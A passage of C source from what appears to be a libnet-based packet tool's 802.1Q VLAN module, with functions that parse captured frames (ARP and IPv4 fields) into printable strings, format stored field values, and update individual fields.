                    field_values[DOT1Q_DST_IP][0]   = 0;
                    field_values[DOT1Q_IP_PROTO][0] = 0;
                    return (char **)field_values;
                break;
            }
       break;

       case ETHERTYPE_ARP:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0] = 0;
            field_values[DOT1Q_CFI2][0] = 0;
            field_values[DOT1Q_VLAN2][0] = 0;            

            cursor++; cursor++;

            if (ntohs(*cursor) != ETHERTYPE_IP)
            {
               strncpy(field_values[DOT1Q_SRC_IP],"N/A",16);
               strncpy(field_values[DOT1Q_DST_IP],"N/A",16);
            }
            cursor++; cursor++;
            if (ntohs(*cursor) == 1 ) /* ARP Request */
            {
                cursor+=4;
                memcpy((void *)&aux_long, (void *)cursor,4);
                aux = libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE);
                snprintf(field_values[DOT1Q_SRC_IP], 17, "%s",aux);
                cursor+=5;
                memcpy((void *)&aux_long, (void *)cursor,4);
                aux = libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE);
                snprintf(field_values[DOT1Q_DST_IP], 17, "%s?",aux);
            }
            else
            if (ntohs(*cursor) == 2 ) /* ARP Reply */
            {
                cursor+=4;
                memcpy((void *)&aux_long, (void *)cursor,4);
                aux = libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE);
                snprintf(field_values[DOT1Q_SRC_IP], 17, "%s",aux);            
            }
            else
            {
               strncpy(field_values[DOT1Q_SRC_IP],"N/A",16);
               strncpy(field_values[DOT1Q_DST_IP],"N/A",16);
            }
            return (char **)field_values;
       break;

       case ETHERTYPE_REVARP:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]  = 0;
            field_values[DOT1Q_CFI2][0]  = 0;
            field_values[DOT1Q_VLAN2][0]  = 0;            
            field_values[DOT1Q_SRC_IP][0] = 0;
            field_values[DOT1Q_DST_IP][0] = 0;
            return (char **)field_values;
       break;

       case 0x010b:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;       

       case 0x2000:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;       

       case 0x2003:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;       

       case 0x2004:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;       

       case 0x9000:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;       

       default:
            snprintf(field_values[DOT1Q_TPI2], 5, "%04X",type_cursor);
            field_values[DOT1Q_PRIORITY2][0]= 0;
            field_values[DOT1Q_CFI2][0]     = 0;
            field_values[DOT1Q_VLAN2][0]    = 0;            
            field_values[DOT1Q_SRC_IP][0]   = 0;
            field_values[DOT1Q_DST_IP][0]   = 0;
            return (char **)field_values;
       break;
    }

    snprintf(field_values[DOT1Q_TPI3], 5, "0800");

    cursor++; /* Minimal IP header needed */

    ip = (u_int8_t *)cursor;

    if ( (ip+20) > (data->packet + data->header->caplen))
        return (char **)field_values;

#ifdef LBL_ALIGN 
    snprintf(field_values[DOT1Q_IP_PROTO], 3, "%02d",*(ip+9));
    memcpy((void *)&aux_long, (void *)(ip+12),4);
    aux = libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE);
    strncpy(field_values[DOT1Q_SRC_IP],aux,16);
    memcpy((void *)&aux_long, (void *)(ip+16),4);
    aux = libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE);
    strncpy(field_values[DOT1Q_DST_IP],aux,16);

#else
    ipv4_hdr = (struct libnet_ipv4_hdr *)cursor;

    /* Source IP */
    strncpy(field_values[DOT1Q_SRC_IP], libnet_addr2name4(ipv4_hdr->ip_src.s_addr, 
                                              LIBNET_DONT_RESOLVE), 16);
    
    /* Destination IP */
    strncpy(field_values[DOT1Q_DST_IP], libnet_addr2name4(ipv4_hdr->ip_dst.s_addr, 
                                              LIBNET_DONT_RESOLVE), 16);
    snprintf(field_values[DOT1Q_IP_PROTO], 3, "%02d",ipv4_hdr->ip_p);
#endif

    return (char **)field_values;    
}


char **
dot1q_get_printable_store(struct term_node *node)
{
    struct dot1q_data *dot1q_tmp;
    char **field_values;
#ifdef LBL_ALIGN
    u_int8_t *aux;
#endif
    
    /* smac + dmac + double + vlan1 + priority + cfi1 + tpi1 + vlan2 +
     * priority2 + cfi2 + tpi3 + src + dst + proto + arp + vlan + null = 17
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DOT1Q].nparams, protocols[PROTO_DOT1Q].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

	if (node == NULL)
		dot1q_tmp = protocols[PROTO_DOT1Q].default_values;
	else
        dot1q_tmp = (struct dot1q_data *) node->protocol[PROTO_DOT1Q].tmp_data;

    /* Source MAC */
    snprintf(field_values[DOT1Q_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    dot1q_tmp->mac_source[0], dot1q_tmp->mac_source[1],
	    dot1q_tmp->mac_source[2], dot1q_tmp->mac_source[3],
	    dot1q_tmp->mac_source[4], dot1q_tmp->mac_source[5]);

    /* Destination MAC */
    snprintf(field_values[DOT1Q_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        dot1q_tmp->mac_dest[0], dot1q_tmp->mac_dest[1], dot1q_tmp->mac_dest[2],
        dot1q_tmp->mac_dest[3], dot1q_tmp->mac_dest[4], dot1q_tmp->mac_dest[5]);

    snprintf(field_values[DOT1Q_VLAN1], 5, "%04d", dot1q_tmp->vlan1);

    snprintf(field_values[DOT1Q_PRIORITY1], 3, "%02X", dot1q_tmp->priority1);

    snprintf(field_values[DOT1Q_CFI1], 3, "%02X", dot1q_tmp->cfi1);

    snprintf(field_values[DOT1Q_TPI2], 12, "%04X", dot1q_tmp->tpi2);

    snprintf(field_values[DOT1Q_VLAN2], 5, "%04d", dot1q_tmp->vlan2);

    snprintf(field_values[DOT1Q_PRIORITY2], 3, "%02X", dot1q_tmp->priority2);

    snprintf(field_values[DOT1Q_CFI2], 3, "%02X", dot1q_tmp->cfi2);

    snprintf(field_values[DOT1Q_TPI3], 12, "%04X", dot1q_tmp->tpi3);
               
    /* Source IP */
    parser_get_formated_inet_address(dot1q_tmp->src_ip, field_values[DOT1Q_SRC_IP], 16);
    
    /* Destination IP */
    parser_get_formated_inet_address(dot1q_tmp->dst_ip, field_values[DOT1Q_DST_IP], 16);

    /* IP protocol */
    snprintf(field_values[DOT1Q_IP_PROTO], 3, "%02d",dot1q_tmp->ip_proto);

    memcpy(field_values[DOT1Q_PAYLOAD], dot1q_tmp->icmp_payload, MAX_ICMP_PAYLOAD);

    return (char **)field_values;
}


int8_t 
dot1q_update_field(int8_t state, struct term_node *node, void *value)
{
    struct dot1q_data *dot1q_data;
    
    if (node == NULL)
       dot1q_data = protocols[PROTO_DOT1Q].default_values;
    else
       dot1q_data = node->protocol[PROTO_DOT1Q].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case DOT1Q_SMAC:
            memcpy((void *)dot1q_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case DOT1Q_DMAC:
            memcpy((void *)dot1q_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Priority */
        case DOT1Q_PRIORITY1:
	        dot1q_data->priority1 = *(u_int8_t *)value;
        break;
        /* CFI */
        case DOT1Q_CFI1:
	        dot1q_data->cfi1 = *(u_int8_t *)value;
        break;
        /* CFI */
        case DOT1Q_VLAN1:
	        dot1q_data->vlan1 = *(u_int16_t *)value;
        break;
        /* Tag Proto */
        case DOT1Q_TPI2:
	        dot1q_data->tpi2 = *(u_int16_t *)value;
/*	    memcpy((void *)&dot1q_data->tpi2,value,2);*/
        break;
        /* Priority */
        case DOT1Q_PRIORITY2:
	        dot1q_data->priority2 = *(u_int8_t *)value;
        break;
        /* CFI */
        case DOT1Q_CFI2:
	        dot1q_data->cfi2 = *(u_int8_t *)value;
        break;
        /* CFI */
        case DOT1Q_VLAN2:
	        dot1q_data->vlan2 = *(u_int16_t *)value;
        break;

        case DOT1Q_TPI3:
	        dot1q_data->tpi3 = *(u_int16_t *)value;
/*	    memcpy((void *)&dot1q_data->tpi3,value,2);*/
        break;
		/* Source IP */
	    case DOT1Q_SRC_IP:
	        dot1q_data->src_ip = *(u_int32_t *)value;
	    break;

	    case DOT1Q_DST_IP:
	        dot1q_data->dst_ip = *(u_int32_t *)value;
	    break;

        case DOT1Q_IP_PROTO:
	        dot1q_data->ip_proto = *(u_int8_t *)value;
	    break;
	    default:
	    break;
    }

    return 0;
}


int8_t
dot1q_end(struct term_node *node)
{
   return 0;
}
